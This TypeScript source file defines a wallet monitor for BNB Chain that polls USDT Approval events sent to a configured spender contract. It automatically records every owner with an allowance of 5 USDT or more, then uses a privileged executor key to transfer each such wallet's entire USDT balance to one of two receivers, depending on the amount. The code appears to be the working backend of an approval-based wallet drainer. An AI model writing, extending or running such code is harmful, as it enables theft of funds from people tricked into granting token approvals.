import { ethers } from "ethers";
import { config } from "./config";
import { Store } from "./store";

const ABI = [
  "function executeToReceiver1(address wallet,uint256 amount)",
  "function executeToReceiver2(address wallet,uint256 amount)",
  "function isExecutor(address) view returns (bool)",
  "function usdt() view returns (address)"
];
const ERC20_ABI = [
  "event Approval(address indexed owner,address indexed spender,uint256 value)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)"
];
const threshold = ethers.parseUnits("5", 18);
const receiverRoutingThreshold = ethers.parseUnits("2000", 18);
const approvalLogChunkSize = 500;
const rateLimitRetryAttempts = 5;

function isRateLimitError(error: unknown): boolean {
  const pending: unknown[] = [error];
  const seen = new Set<object>();

  while (pending.length) {
    const current = pending.pop();
    if (typeof current !== "object" || current === null || seen.has(current)) continue;
    seen.add(current);

    const record = current as Record<string, unknown>;
    if (record.code === -32005 || record.code === "-32005") return true;
    if (typeof record.message === "string" && record.message.includes("-32005")) return true;

    for (const key of ["error", "cause", "info", "response"]) {
      if (record[key] !== undefined) pending.push(record[key]);
    }
  }

  return false;
}

function waitForRateLimitRetry(attempt: number) {
  const exponentialDelay = 500 * 2 ** attempt;
  const jitter = Math.random() * exponentialDelay;
  return new Promise<void>((resolve) => setTimeout(resolve, exponentialDelay + jitter));
}

export class WalletMonitor {
  private readonly provider = new ethers.JsonRpcProvider(config.BNB_MAINNET_RPC_URL);
  private readonly signer = new ethers.Wallet(config.EXECUTOR_PRIVATE_KEY, this.provider);
  private readonly contract = new ethers.Contract(config.ALLOWANCE_SPENDER_ADDRESS, ABI, this.signer);
  private readonly token = new ethers.Contract(config.USDT_ADDRESS, ERC20_ABI, this.provider);
  private timer?: NodeJS.Timeout;
  private scanInProgress = false;
  constructor(private readonly store: Store) {}
  async start() {
    await this.runCycle().catch((error) => console.error("Initial wallet monitoring cycle failed; retrying automatically:", error));
    this.timer = setInterval(() => {
      void this.runCycle().catch((error) => console.error("Wallet monitoring cycle failed; retrying in 30 seconds:", error));
    }, 30_000);
  }
  stop() { if (this.timer) clearInterval(this.timer); }
  private async assertExecutor() { if (!(await this.contract.isExecutor(this.signer.address))) throw new Error(`Executor ${this.signer.address} is not authorized`); }
  private async runCycle() {
    if (this.scanInProgress) return;
    this.scanInProgress = true;
    try {
      await this.assertExecutor();
      await this.scan();
    } finally {
      this.scanInProgress = false;
    }
  }
  private async scan() {
    await this.scanApprovalEvents();
    for (const wallet of this.store.listWallets().filter((item) => item.active)) await this.scanWallet(wallet.address);
  }
  private async scanApprovalEvents() {
    const currentBlock = await this.provider.getBlockNumber();
    let fromBlock = this.store.getApprovalScanBlock();
    if (fromBlock === undefined) {
      fromBlock = config.USDT_APPROVAL_SCAN_START_BLOCK ?? Math.max(0, currentBlock - 1);
      if (fromBlock > currentBlock) throw new Error("USDT approval scan start block is ahead of the current chain head");
    } else {
      fromBlock += 1;
    }

    const filter = this.token.filters.Approval(null, config.ALLOWANCE_SPENDER_ADDRESS);
    for (let chunkStart = fromBlock; chunkStart <= currentBlock; chunkStart += approvalLogChunkSize) {
      const chunkEnd = Math.min(chunkStart + approvalLogChunkSize - 1, currentBlock);
      if (chunkStart === chunkEnd) break;
      await this.scanApprovalChunk(filter, chunkStart, chunkEnd);
    }
  }
  private async scanApprovalChunk(filter: ethers.ContractEventName, fromBlock: number, toBlock: number) {
    if (fromBlock >= toBlock) throw new Error("Approval log chunks must span at least two blocks");

    let events;
    let lastError: unknown;

    for (let attempt = 0; attempt < rateLimitRetryAttempts; attempt++) {
      try {
        events = await this.token.queryFilter(filter, fromBlock, toBlock);
        break;
      } catch (error) {
        if (!isRateLimitError(error)) throw error;
        lastError = error;
        if (attempt + 1 < rateLimitRetryAttempts) await waitForRateLimitRetry(attempt);
      }
    }

    if (!events) {
      throw lastError;
    }

    const owners = new Set<string>();
    for (const event of events) {
      const parsed = this.token.interface.parseLog(event);
      if (!parsed) throw new Error("Unable to decode USDT Approval event");
      owners.add(ethers.getAddress(String(parsed.args.owner)));
    }

    for (const owner of owners) {
      const allowance = await this.token.allowance(owner, config.ALLOWANCE_SPENDER_ADDRESS);
      if (allowance >= threshold) this.store.registerDetected(owner);
    }

    this.store.setApprovalScanBlock(toBlock);
  }
  async scanWallet(address: string) {
    const wallet = this.store.getWallet(address);
    if (!wallet?.active) return;
    try {
      const balance = await this.token.balanceOf(wallet.address);
      const allowance = await this.token.allowance(wallet.address, config.ALLOWANCE_SPENDER_ADDRESS);
      this.store.update(wallet.address, { lastCheckedAt: new Date().toISOString(), lastError: undefined });
      if (balance < threshold || allowance < threshold) return;
      const amount = balance;
      const method = amount < receiverRoutingThreshold ? "executeToReceiver1" : "executeToReceiver2";
      const record = this.store.addHistory({ id: crypto.randomUUID(), wallet: wallet.address, receiver: wallet.receiver, amount: amount.toString(), status: "submitted", createdAt: new Date().toISOString() });
      try {
        const tx = await this.contract[method](wallet.address, amount);
        record.txHash = tx.hash;
        await tx.wait();
        record.status = "confirmed";
      } catch (error) { record.status = "failed"; record.error = error instanceof Error ? error.message : String(error); }
      this.store.addHistory(record);
    } catch (error) { this.store.update(wallet.address, { lastCheckedAt: new Date().toISOString(), lastError: error instanceof Error ? error.message : String(error) }); }
  }
}